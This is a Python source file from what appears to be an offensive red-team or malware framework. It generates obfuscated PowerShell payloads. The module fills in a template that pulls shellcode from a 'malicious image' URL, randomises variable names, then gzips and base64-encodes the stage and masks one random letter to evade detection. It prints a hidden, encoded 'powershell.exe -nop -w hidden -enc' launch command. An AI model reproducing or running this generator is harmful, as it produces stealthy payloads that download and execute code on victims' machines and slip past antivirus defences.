from module import ModuleObject
import base64
import os
import time
import gzip
import tempfile
import random
import string

class PsModule(ModuleObject):
    
    def __init__(self, ui):
        ModuleObject.__init__(self)
        self.ui = ui
        self.vars = {}
        self.vars["url"] = ["", "Url that point to the malicious image"]
        self.vars["rand"] = ["true", "Use random variables name"]
        self.description = "Module to generate Powershell payload"
        self.module_name = "powershell"
        
    def run_action(self):
        stage1 = ""
        if self.vars["rand"][0].lower() == "true" or True:
            stage1 = self.load_file("core/util/exec-sc-rand.ps1").replace("[URL]", self.vars["url"][0])
            for i in reversed(range(1, 12)):
                stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(3, 10)))
			
        path = self.write_file(stage1)
	letter = random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase)
        stage1 = self.read_file(path).replace(letter, "!")
        self.delete_file(path)
	
        stage2 = self.load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
	stage2 = stage2.replace("[CHAR]", letter)
	for i in range(1, 3):
                stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
		
        self.ui.print_msg("Powershell script:")
        print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
        
    def gen_str(self, size):
        return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
		
    def load_file(self, path):
        path = os.getcwd() + "/" + path
        if os.path.exists(path):
            return open(path, "rb").read()
        else:
            self.ui.print_error("%s not found" % path)
            return False
        
    def convert_to_unicode(self, data, do_base64 = True):
        unicode_string = ""
        for char in data:
            unicode_string += char + "\x00"
        
        if do_base64:
            return base64.b64encode(unicode_string)
        return unicode_string
    
    def write_file(self, data):
        path = tempfile.gettempdir() + "/" + str(time.time())
        fd = gzip.open(path, "wb")
        fd.write(data)
        fd.close()
        return path
        
    def delete_file(self, path):
        os.unlink(path)
        
    def read_file(self, path):
        return base64.b64encode(open(path, "rb").read())
